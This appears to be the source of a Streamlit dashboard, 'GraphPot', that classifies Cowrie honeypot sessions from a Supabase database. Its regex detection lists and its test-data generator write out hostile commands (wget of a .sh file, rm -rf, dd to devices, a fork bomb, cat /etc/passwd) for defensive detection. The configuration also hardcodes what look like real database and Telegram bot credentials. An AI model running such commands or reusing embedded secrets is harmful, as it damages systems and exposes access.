import streamlit as st
import pandas as pd
import psycopg2
from psycopg2.extras import RealDictCursor
import json
import requests
from streamlit_autorefresh import st_autorefresh
from pyvis.network import Network
import streamlit.components.v1 as components
import networkx as nx
import tempfile
import os
import re
import random
from datetime import datetime
import socket
import time

# --- Configuration ---
DB_HOST = "aws-0-ap-southeast-1.pooler.supabase.com"
DB_NAME = "postgres"
DB_USER = "postgres.ypsdflhceqxrjwyxvclr"
DB_PASS = "Serigala76!" # <--- STILL VERIFY THIS PASSWORD CAREFULLY!
DB_PORT = 5432

TELEGRAM_TOKEN = "8083560973:AAGoQstYrKVGVSIincqQ3r_MyGvurDVtNMo"
TELEGRAM_CHAT_ID = "623056896"

# --- Detection Patterns ---
MALWARE_PATTERNS = [
    r"wget\s+(https?|ftp)://",
    r"curl\s+(https?|ftp)://",
    r"\.(sh|bin|exe|py|js)\s*$"
]

WIPER_PATTERNS = [
    r"rm\s+-rf",
    r"dd\s+if=/dev/",
    r":\(\)\{:\|:\&\};:",
    r"mv\s+/dev/null",
    r">\s+/dev/sd[a-z]"
]

RECON_PATTERNS = [
    r"cat\s+/etc/passwd",
    r"uname\s+-a",
    r"whoami",
    r"busybox",
    r"nmap",
    r"ping\s+-t",
    r"ss\s+-tuln"
]

BRUTE_FORCE_THRESHOLD = 5

# --- Attack Color Mapping ---
ATTACK_COLORS = {
    "Brute Force Attack": "#D1ECF1",
    "Destructive Attack (Wiper)": "#FFB6B6",
    "Malware Download Attempt": "#FFF3CD",
    "Reconnaissance / Enumeration": "#E2E3E5",
    "Port Scanning / Connection Attempt": "#D4EDDA",
    "Command Injection Attempt": "#F8D7DA",
    "Successful Login": "#D1E7DD",
    "Failed Login": "#F8F9FA",
    "Unknown Activity": "#F0F0F0"
}

# --- Database Functions ---
@st.cache_resource(ttl=3600)
def get_connection():
    """Create and cache database connection with comprehensive error handling"""
    connection_params = {
        "host": DB_HOST,
        "dbname": DB_NAME,
        "user": DB_USER,
        "password": DB_PASS,
        "port": DB_PORT,
        "cursor_factory": RealDictCursor,
        "sslmode": "require",
        "connect_timeout": 10
    }
    
    st.info(f"Attempting to connect to DB: {DB_USER}@{DB_HOST}:{DB_PORT}/{DB_NAME}")
    try:
        conn = psycopg2.connect(**connection_params)
        
        with conn.cursor() as cur:
            cur.execute("SELECT 1")
            result = cur.fetchone()
            if result is None or result[0] != 1:
                raise ValueError("Connection test failed: SELECT 1 did not return expected value.")
        
        st.success("✅ Database connection established successfully!")
        return conn
        
    except psycopg2.OperationalError as e:
        st.error(f"""
        ❌ Database connection failed (OperationalError):
        - Check your internet connection
        - Verify database is running
        - Confirm host/port are correct
        - Firewall might be blocking port {DB_PORT}
        Error details: `{str(e)}`
        """)
        print(f"DEBUG: OperationalError in get_connection: {e}")
    except psycopg2.Error as e:
        st.error(f"""
        ❌ PostgreSQL error:
        - Check your credentials (user/password)
        - Verify user permissions for database '{DB_NAME}'
        - Ensure `sslmode='require'` is appropriate for your Supabase setup
        Error details: `{str(e)}`
        """)
        print(f"DEBUG: Psycopg2Error in get_connection: {e}")
    except Exception as e:
        st.error(f"""
        ❌ Unexpected error during database connection:
        - Please check all parameters (host, name, user, password, port) for typos.
        - Ensure your Supabase database is active and not paused.
        Error details: `{str(e)}`
        """)
        print(f"DEBUG: Generic Exception in get_connection: {e}")
    
    return None

def execute_query(query, params=None):
    """Execute SQL query with robust connection handling"""
    conn = None
    max_retries = 2
    retry_delay = 2 
    
    for attempt in range(max_retries + 1):
        try:
            conn = get_connection()
            if conn is None:
                st.error("Failed to get database connection after retries.")
                return None
            
            with conn.cursor() as cur:
                st.info(f"Executing query (attempt {attempt + 1}/{max_retries + 1}): `{query.strip().splitlines()[0]}...`")
                cur.execute(query, params or ())
                
                if cur.description:  
                    results = cur.fetchall()
                    st.info(f"Query returned {len(results)} rows.")
                    return results
                else: 
                    conn.commit()
                    st.success("Query executed successfully (no results expected).")
                    return True
                
        except (psycopg2.InterfaceError, psycopg2.OperationalError) as e:
            if attempt < max_retries:
                st.warning(f"⚠️ Connection issue detected, retrying... (attempt {attempt + 1}/{max_retries + 1}) Error: `{str(e)}`")
                st.cache_resource.clear() 
                time.sleep(retry_delay)
                continue
            st.error(f"❌ Query failed after retries (Interface/Operational Error): `{str(e)}`")
            print(f"DEBUG: Query failed after retries: {e}")
            return None
        except psycopg2.Error as e:
            st.error(f"❌ PostgreSQL error during query execution: `{str(e)}`")
            print(f"DEBUG: Psycopg2Error during execute_query: {e}")
            return None
        except Exception as e:
            st.error(f"❌ Unexpected error during query execution: `{str(e)}`")
            print(f"DEBUG: Generic Exception during execute_query: {e}")
            return None
        finally:
            pass

def test_network():
    """Test network connectivity to database host"""
    try:
        with st.spinner(f"Testing connection to {DB_HOST}:{DB_PORT}..."):
            sock = socket.create_connection((DB_HOST, DB_PORT), timeout=5)
            sock.close()
            st.success("✅ Network connection to database host successful!")
            return True
    except Exception as e:
        st.error(f"""
        ❌ Network connection failed to `{DB_HOST}:{DB_PORT}`:
        Error details: `{str(e)}`
        
        Possible issues:
        1. Firewall blocking outbound port {DB_PORT} from where Streamlit is running.
        2. DNS resolution failure for `{DB_HOST}`.
        3. Database host `{DB_HOST}` is unreachable or incorrect.
        """)
        print(f"DEBUG: Network test failed: {e}")
        return False

def test_db_connection():
    """Test database connectivity with detailed feedback"""
    with st.spinner("Testing database connection..."):
        try:
            conn = psycopg2.connect(
                host=DB_HOST,
                dbname=DB_NAME,
                user=DB_USER,
                password=DB_PASS,
                port=DB_PORT,
                sslmode="require",
                connect_timeout=10
            )
            
            with conn.cursor() as cur:
                cur.execute("SELECT version()")
                version = cur.fetchone()
                
                cur.execute("SELECT current_database()")
                db_name = cur.fetchone()
                
                cur.execute("SELECT current_user")
                db_user = cur.fetchone()
                
            conn.close() 

            st.success("✅ Direct database connection successful!")
            st.json({
                "PostgreSQL Version": version[0] if version else "N/A",
                "Database Name": db_name[0] if db_name else "N/A",
                "Connected As": db_user[0] if db_user else "N/A"
            })
            return True
            
        except Exception as e:
            st.error(f"""
            ❌ Direct database connection failed:
            Error details: `{str(e)}`
            
            Troubleshooting steps:
            1. **Verify your credentials (`DB_USER`, `DB_PASS`) in Supabase dashboard.**
            2. Check network connectivity (firewall, routing).
            3. Ensure SSL is enabled and correctly configured on both client and server (Supabase requires `sslmode=require`).
            4. Confirm database instance is running and not paused in Supabase.
            """)
            print(f"DEBUG: Direct DB connection test failed: {e}")
            return False

@st.cache_data(ttl=60)
@st.cache_data(ttl=60)
def load_data():
    """Load and process data from database"""
    query = """
        SELECT *, 
               COUNT(*) OVER (PARTITION BY src_ip, eventid) as attempt_count
        FROM hornet7_data 
        ORDER BY timestamp DESC 
        LIMIT 500
    """
    rows = execute_query(query)
    if rows is None:
        return pd.DataFrame()
    
    df = pd.DataFrame(rows)
    
    # Apply attack detection
    attack_info = []
    for _, row in df.iterrows():
        attack_info.append(detect_attack_type(row))
    
    df['attack_type'] = [x[0] for x in attack_info]
    df['attack_details'] = [x[1] for x in attack_info]
    
    return df
    
    if rows is None:
        st.warning("⚠️ No data retrieved from the database. This could mean the table is empty, or there was a query/connection issue. Check console for `execute_query` errors.")
        return pd.DataFrame()
    if not rows: 
        st.warning("⚠️ Query executed, but no rows were returned. The `hornet7_data` table might be empty.")
        return pd.DataFrame()
        
    df = pd.DataFrame(rows)
    st.info(f"Successfully loaded {len(df)} rows from the database.")
    
    # Rename the calculated column to match what detect_attack_type expects
    df.rename(columns={'calculated_attempt_count': 'attempt_count'}, inplace=True)

    # Apply attack detection
    attack_info = []
    for _, row in df.iterrows():
        attack_info.append(detect_attack_type(row))
        
    df['attack_type'] = [x[0] for x in attack_info]
    df['attack_details'] = [x[1] for x in attack_info]
    
    return df

def detect_attack_type(row):
    """Classify attack type based on log entry"""
    eventid = str(row.get('eventid', '')).lower() 
    input_cmd = str(row.get('input', '')).lower() 
    message = str(row.get('message', '')).lower() 
    
    if eventid == 'cowrie.login.failed':
        try:
            # Use the renamed column 'attempt_count'
            attempt_count = int(row.get('attempt_count', 0)) 
        except (ValueError, TypeError):
            attempt_count = 0 
            
        if attempt_count >= BRUTE_FORCE_THRESHOLD:
            return "Brute Force Attack", f"Multiple failed logins ({attempt_count} attempts)"
        return "Failed Login", "Single failed login attempt"
    
    elif eventid == 'cowrie.login.success':
        return "Successful Login", "Login successful"
    
    elif eventid == 'cowrie.command.input':
        for pattern in WIPER_PATTERNS:
            if re.search(pattern, input_cmd):
                return "Destructive Attack (Wiper)", f"Wiper command: {input_cmd[:50]}..."
        
        for pattern in MALWARE_PATTERNS:
            if re.search(pattern, input_cmd):
                return "Malware Download Attempt", f"Download attempt: {input_cmd[:50]}..."
        
        for pattern in RECON_PATTERNS:
            if re.search(pattern, input_cmd):
                return "Reconnaissance / Enumeration", f"Recon command: {input_cmd[:50]}..."
        
        return "Command Injection Attempt", input_cmd[:100]
    
    elif eventid == 'cowrie.session.connect':
        return "Port Scanning / Connection Attempt", f"Connection to port {row.get('dst_port', 'N/A')}"
    
    return "Unknown Activity", message[:100]

def build_session_graph(row):
    """Create network graph for a session"""
    G = nx.DiGraph()
    src_ip = row.get('src_ip')
    eventid = row.get('eventid')
    dst_port = row.get('dst_port')
    attack_type = row.get('attack_type')
    
    color_map = {
        "Brute Force Attack": "#FF6B6B",
        "Destructive Attack (Wiper)": "#FF0000",
        "Malware Download Attempt": "#FFA500",
        "Reconnaissance / Enumeration": "#ADD8E6",
        "Port Scanning / Connection Attempt": "#90EE90",
        "Command Injection Attempt": "#FFD700", 
        "Successful Login": "#32CD32", 
        "Failed Login": "#FFC0CB", 
        "Unknown Activity": "#808080" 
    }
    
    if src_ip:
        G.add_node(f"src_ip_{src_ip}", # Use unique ID for node
                    label=f"Source: {src_ip}",
                    color=color_map.get(attack_type, "lightblue"),
                    shape="box")
    
    if eventid:
        G.add_node(f"event_{eventid}", # Use unique ID for node
                    label=f"Event: {eventid}",
                    color="#F0F0F0", 
                    shape="ellipse")
    
    if dst_port:
        port_node = f"Port {dst_port}"
        G.add_node(f"port_{dst_port}", # Use unique ID for node
                    label=port_node,
                    color="#D8BFD8", 
                    shape="diamond")
    
    # Add edges
    if src_ip and eventid:
        G.add_edge(f"src_ip_{src_ip}", f"event_{eventid}", 
                    title=f"Attack: {attack_type}",
                    color=color_map.get(attack_type, "grey"))
    
    if eventid and dst_port:
        G.add_edge(f"event_{eventid}", f"port_{dst_port}", 
                    title=f"Target port: {dst_port}",
                    color="#888888")
    
    return G

def main():
    st.set_page_config(
        page_title="GraphPot - Network Session Analysis", 
        layout="wide",
        initial_sidebar_state="expanded"
    )
    
    st.title("🛡️ GraphPot - Network Session Analysis")
    
    # Connection diagnostics
    with st.expander("🔍 Connection Diagnostics", expanded=True):
        col1, col2 = st.columns(2)
        
        network_ok = False
        db_ok = False

        with col1:
            st.subheader("Network Test")
            # Automatically run on initial load, provide button for manual re-test
            if st.button("Test Network Connectivity", key="test_net_btn_manual"):
                network_ok = test_network()
            else:
                network_ok = test_network() # Run on initial page load
        
        with col2:
            st.subheader("Database Test")
            # Automatically run on initial load, provide button for manual re-test
            if st.button("Test Database Connection", key="test_db_btn_manual"):
                db_ok = test_db_connection()
            else:
                db_ok = test_db_connection() # Run on initial page load
    
    # Only proceed if both tests pass
    if not (network_ok and db_ok):
        st.error("""
        ❌ Critical connection issues detected. Please review the diagnostics above.
        Resolve these issues (e.g., incorrect credentials, firewall) before the dashboard can load.
        """)
        st.cache_resource.clear()
        return 
        
    st.success("✅ All systems operational - loading dashboard...")
    
    if st.button("🔄 Refresh Data"):
        st.cache_data.clear() 
        st.rerun()

    st.markdown("---")

    # --- Auto Test Data Generator ---
    st.sidebar.header("🧪 Test Data Generator")
    attack_type = st.sidebar.selectbox(
        "Select attack type:",
        ["Brute Force", "Malware Download", "Wiper Attack", "Reconnaissance", "Port Scan"]
    )
    
    if st.sidebar.button("🚀 Auto Insert Test Data"):
        test_data = {
            "timestamp": datetime.now().isoformat(),
            "src_ip": f"10.0.{random.randint(1,255)}.{random.randint(1,255)}",
            "session": f"TEST-{random.randint(1000,9999)}",
            "dst_port": str(random.choice([22, 80, 443, 8080]))
        }
        
        if attack_type == "Brute Force":
            test_data.update({
                "eventid": "cowrie.login.failed",
                "message": "Failed login attempt"
            })
            # Note: attempt_count is NOT inserted as a column, it's calculated.
            # So, don't include it in the INSERT query for the database.
        elif attack_type == "Malware Download":
            test_data.update({
                "eventid": "cowrie.command.input",
                "input": "wget http://test.com/malware.sh"
            })
        elif attack_type == "Wiper Attack":
            test_data.update({
                "eventid": "cowrie.command.input",
                "input": "rm -rf /important/files"
            })
        elif attack_type == "Reconnaissance":
            test_data.update({
                "eventid": "cowrie.command.input",
                "input": "cat /etc/passwd"
            })
        elif attack_type == "Port Scan":
            test_data.update({
                "eventid": "cowrie.session.connect",
                "message": f"Port scan detected on {test_data['dst_port']}"
            })
        
        # Ensure the INSERT statement matches your actual table columns.
        # If your table has a 'status' column, add it and a default value.
        insert_query = """
            INSERT INTO hornet7_data 
            (timestamp, src_ip, eventid, input, message, session, dst_port)
            VALUES (%s, %s, %s, %s, %s, %s, %s)
            ON CONFLICT (session) DO UPDATE SET
            timestamp = EXCLUDED.timestamp,
            src_ip = EXCLUDED.src_ip,
            eventid = EXCLUDED.eventid,
            input = EXCLUDED.input,
            message = EXCLUDED.message,
            dst_port = EXCLUDED.dst_port;
            """
        # Make sure 'session' is a UNIQUE constraint or Primary Key for ON CONFLICT to work
        # If 'session' is not unique, remove the ON CONFLICT clause and handle potential duplicates.
        # Example if 'session' is NOT unique (simpler insert):
        # insert_query = """
        #     INSERT INTO hornet7_data
        #     (timestamp, src_ip, eventid, input, message, session, dst_port)
        #     VALUES (%s, %s, %s, %s, %s, %s, %s);
        #     """

        insert_params = (
            test_data.get('timestamp'),
            test_data.get('src_ip'),
            test_data.get('eventid'),
            test_data.get('input'),
            test_data.get('message'),
            test_data.get('session'),
            test_data.get('dst_port')
        )
        
        if execute_query(insert_query, insert_params):
            st.sidebar.success(f"Inserted {attack_type} test data!")
            st.cache_data.clear() 
            st.rerun()
        else:
            st.sidebar.error("Failed to insert test data. Check error messages above.")

    # Load data with progress indicator
    with st.spinner('Loading threat data...'):
        df = load_data()

    if not df.empty:
        # --- Summary Metrics ---
        st.subheader("📊 Attack Summary")
        cols = st.columns(4)
        metrics = [
            ("🔒 Brute Force", "Brute Force Attack"),
            ("🐍 Malware Download", "Malware Download Attempt"),
            ("🔥 Wiper Attack", "Destructive Attack (Wiper)"),
            ("🕵️ Reconnaissance", "Reconnaissance / Enumeration")
        ]
        
        for (icon, metric), col in zip(metrics, cols):
            col.metric(icon, (df['attack_type'] == metric).sum())

        st.markdown("---")

        # --- Moving Marquee ---
        top_ips = df['src_ip'].value_counts().head(3).index.tolist()
        top_sessions = df['session'].value_counts().head(3).index.tolist()
        top_events = df['eventid'].value_counts().head(3).index.tolist()

        moving_text = f"Top IPs: {', '.join(top_ips)} | Top Sessions: {', '.join(top_sessions)} | Top Events: {', '.join(top_events)}"
        st.markdown(
            f'<marquee style="font-size: 18px; color: black; background-color: white; padding: 10px;">{moving_text}</marquee>',
            unsafe_allow_html=True
        )

        st.markdown("---")

        # --- Data Management Section ---
        with st.expander("🛠️ Data Management Controls", expanded=False):
            col1, col2 = st.columns(2)
            
            with col1:
                st.subheader("➕ Insert New Entry")
                with st.form("insert_form"):
                    new_data = {
                        "timestamp": st.text_input("Timestamp (YYYY-MM-DD HH:MM:SS)", datetime.now().strftime("%Y-%m-%d %H:%M:%S")),
                        "src_ip": st.text_input("Source IP", "192.168.1.1"),
                        "eventid": st.selectbox("Event Type", [
                            "cowrie.login.failed", 
                            "cowrie.login.success",
                            "cowrie.command.input",
                            "cowrie.session.connect",
                            "Unknown Activity" 
                        ]),
                        "input": st.text_input("Command Input (if applicable)"),
                        "message": st.text_area("Log Message"),
                        "session": st.text_input("Session ID (e.g., MANUAL-1234)", f"MANUAL-{random.randint(1000,9999)}"),
                        "dst_port": st.text_input("Destination Port", "22") 
                    }
                    if st.form_submit_button("Insert Entry"):
                        insert_query_manual = """
                            INSERT INTO hornet7_data 
                            (timestamp, src_ip, eventid, input, message, session, dst_port)
                            VALUES (%s, %s, %s, %s, %s, %s, %s)
                            ON CONFLICT (session) DO UPDATE SET
                            timestamp = EXCLUDED.timestamp,
                            src_ip = EXCLUDED.src_ip,
                            eventid = EXCLUDED.eventid,
                            input = EXCLUDED.input,
                            message = EXCLUDED.message,
                            dst_port = EXCLUDED.dst_port;
                        """ 
                        insert_params_manual = (
                            new_data.get('timestamp'),
                            new_data.get('src_ip'),
                            new_data.get('eventid'),
                            new_data.get('input'),
                            new_data.get('message'),
                            new_data.get('session'),
                            new_data.get('dst_port')
                        )
                        if execute_query(insert_query_manual, insert_params_manual):
                            st.success("Entry inserted successfully!")
                            st.cache_data.clear()
                            st.rerun()
                        else:
                            st.error("Failed to insert entry. Check error messages above.")
            
            with col2:
                st.subheader("✏️ Update Entry Status")
                with st.form("update_form"):
                    session_ids_for_update = [""] + sorted(df['session'].unique().tolist()) 
                    session_id_to_update = st.selectbox("Select Session ID to update", session_ids_for_update, key="update_session_select")
                    # Assuming you have a 'status' column in hornet7_data
                    new_status = st.selectbox("Update Status", [
                        "investigating", 
                        "resolved", 
                        "false_positive",
                        "new" 
                    ])
                    if st.form_submit_button("Update Status"):
                        if session_id_to_update:
                            if execute_query("""
                                UPDATE hornet7_data 
                                SET status = %s
                                WHERE session = %s
                                """, 
                                (new_status, session_id_to_update)
                            ):
                                st.success(f"Entry with Session ID '{session_id_to_update}' updated to '{new_status}' successfully!")
                                st.cache_data.clear()
                                st.rerun()
                            else:
                                st.error("Failed to update entry. Check error messages above.")
                        else:
                            st.warning("Please select a Session ID to update.")
                        
                st.subheader("❌ Delete Entry")
                with st.form("delete_form"):
                    session_ids_for_delete = [""] + sorted(df['session'].unique().tolist()) 
                    del_id = st.selectbox("Select Session ID to delete", session_ids_for_delete, key="delete_session_select")
                    if st.form_submit_button("Delete Entry"):
                        if del_id:
                            if execute_query("""
                                DELETE FROM hornet7_data 
                                WHERE session = %s
                                """, 
                                (del_id,)
                            ):
                                st.success(f"Entry with Session ID '{del_id}' deleted successfully!")
                                st.cache_data.clear()
                                st.rerun()
                            else:
                                st.error("Failed to delete entry. Check error messages above.")
                        else:
                            st.warning("Please select a Session ID to delete.")

        st.markdown("---")

        # --- Highlight Table ---
        st.subheader("📋 Latest Captured Sessions")
        
        def highlight_rows(row):
            return ['background-color: ' + ATTACK_COLORS.get(row['attack_type'], '#FFFFFF')] * len(row)
        
        attack_filter = st.selectbox("🔍 Filter by Attack Type:", ["All"] + sorted(df['attack_type'].unique().tolist()))
        filtered_df = df if attack_filter == "All" else df[df['attack_type'] == attack_filter]
        
        st.dataframe(
            filtered_df[['timestamp', 'src_ip', 'eventid', 'attack_type', 'dst_port', 'session']] 
            .style.apply(highlight_rows, axis=1),
            use_container_width=True,
            height=400
        )

        st.markdown("---")

        # --- Network Session Mapping ---
        st.subheader("🧠 Network Session Mapping")
        
        session_options = df['session'].unique().tolist()
        if session_options:
            selected_session = st.selectbox(
                "Select a Session ID to visualize:",
                options=session_options
            )
        else:
            selected_session = None
            st.info("No sessions available to visualize in the graph.")

        if selected_session:
            selected_rows = df[df['session'] == selected_session]
            if not selected_rows.empty:
                selected_row = selected_rows.iloc[0] 
                attack_type = selected_row.get('attack_type', 'Unknown Activity')
                bg_color = ATTACK_COLORS.get(attack_type, "#FFFFFF")
                
                with st.spinner('Generating attack graph...'):
                    G = nx.DiGraph()
                    
                    session_events = {} 
                    for _, row in selected_rows.iterrows():
                        current_src_ip = row.get('src_ip')
                        current_eventid = row.get('eventid')
                        current_dst_port = row.get('dst_port')
                        current_attack_type = row.get('attack_type', 'Unknown Activity')

                        if current_src_ip:
                            G.add_node(f"src_ip_{current_src_ip}", label=f"Source: {current_src_ip}",
                                       color=ATTACK_COLORS.get(current_attack_type, "lightblue"), shape="box")
                        
                        if current_eventid:
                            event_node_id = f"event_{current_eventid}"
                            if event_node_id not in session_events:
                                G.add_node(event_node_id, label=f"Event: {current_eventid}",
                                           color="#F0F0F0", shape="ellipse")
                                session_events[event_node_id] = True 

                        if current_dst_port:
                            port_node_id = f"port_{current_dst_port}"
                            G.add_node(port_node_id, label=f"Port {current_dst_port}",
                                       color="#D8BFD8", shape="diamond")

                        if current_src_ip and current_eventid:
                            G.add_edge(f"src_ip_{current_src_ip}", f"event_{current_eventid}",
                                       title=f"Attack: {current_attack_type}",
                                       color=ATTACK_COLORS.get(current_attack_type, "grey"))
                        
                        if current_eventid and current_dst_port:
                            G.add_edge(f"event_{current_eventid}", f"port_{current_dst_port}",
                                       title=f"Target port: {current_dst_port}",
                                       color="#888888")

                    net = Network(
                        height="700px", 
                        width="100%", 
                        directed=True, 
                        notebook=False,
                        cdn_resources="remote"
                    )
                    
                    net.force_atlas_2based(
                        gravity=-50,
                        central_gravity=0.01,
                        spring_length=100,
                        spring_strength=0.08,
                        damping=0.4,
                        overlap=0.1
                    )
                    
                    net.from_nx(G)
                    
                    try:
                        with tempfile.NamedTemporaryFile(delete=False, suffix=".html") as tmp_file:
                            net.save_graph(tmp_file.name)
                            components.html(
                                open(tmp_file.name, 'r', encoding='utf-8').read(), 
                                height=700,
                                width=None
                            )
                        os.unlink(tmp_file.name) 
                    except Exception as e:
                        st.error(f"Failed to render network graph: {e}. Check if graph has nodes/edges.")
                        print(f"DEBUG: Graph render error: {e}")

                st.markdown(f"""
                <div style="background-color:{bg_color}; padding:15px; border-radius:10px">
                <h4>Session Details for Session ID: <code>{selected_session}</code></h4>
                <p><b>First Event Source IP:</b> <code>{selected_row.get('src_ip', 'N/A')}</code></p>
                <p><b>Detected Attack Type (First Event):</b> <code>{attack_type}</code></p>
                <p><b>First Event Target Port:</b> <code>{selected_row.get('dst_port', 'N/A')}</code></p>
                <p><b>First Event Timestamp:</b> <code>{selected_row.get('timestamp', 'N/A')}</code></p>
                <p><b>First Event Details:</b> <code>{selected_row.get('attack_details', 'N/A')}</code></p>
                </div>
                """, unsafe_allow_html=True)
            else:
                st.info(f"No details found for session ID: {selected_session}")
        else:
             st.info("Select a session ID from the dropdown to visualize its network activity.")

    else:
        st.warning("⚠️ No data found in the 'hornet7_data' table. Please use the 'Auto Insert Test Data' or 'Insert New Entry' functions, or ensure your database has data.")

    st_autorefresh(interval=120000, key="data_refresh_main")

if __name__ == "__main__":
    main()
